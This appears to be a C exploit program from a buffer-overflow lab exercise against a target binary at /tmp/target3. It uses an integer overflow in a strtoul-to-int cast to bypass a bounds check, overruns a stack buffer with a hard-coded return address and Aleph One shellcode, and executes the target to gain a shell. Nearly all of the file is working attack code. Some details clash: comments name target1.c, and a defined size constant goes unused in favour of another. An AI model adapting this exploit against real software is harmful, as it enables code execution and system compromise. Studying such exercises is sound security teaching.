#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define EGG_SIZE 20028 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 

/* 
 * Main idea of exploit:
 *     The main idea of is to exploit an integer
 *     overflow vulnerability in the line:
 *       count = (int)strtoul(argv[1], &in, 10);
 *     of target3.c. Note strtoul reads an unsigned
 *     long from a string of characters. We arrange
 *     our input so that this unsigned long is very 
 *     large so that the cast to an int will overflow
 *     causing 'count' to be negative. Thus the test:
 *       if (count < MAX_WIDGETS) 
 *     will pass. Finally, since memcpy takes in a size_t 
 *     as its last argument, we will overflow buf in:
 *       memcpy(buf, in, count * sizeof(struct widget_t));
 *     The rest is boilerplate stack smashing. 
 */

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  char *magic = " 4080219932,";
  long buffAddr, *addrPtr;
  char exploitStr[STR_SIZE]; /* string containing exploit code */
  char *ptr;
  int i;

  buffAddr = 0xBFFF61C8; /* start address of buf in target1.c:foo */
  
  /* First fill the exploit string with the address of the buf in foo. 
     This will ensure that we overwrite the return address with the 
     start address of our code */
  addrPtr = (long *) exploitStr; 
  for (i = 0; i < STR_SIZE; i += 4)
    *(addrPtr++) = buffAddr;
  
  memcpy (exploitStr, magic, strlen (magic));
  	
  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  ptr = &exploitStr[strlen (magic)];
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  exploitStr[STR_SIZE - 1] = 0; /* null terminate exploit string for safety */
  args[1] = exploitStr;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
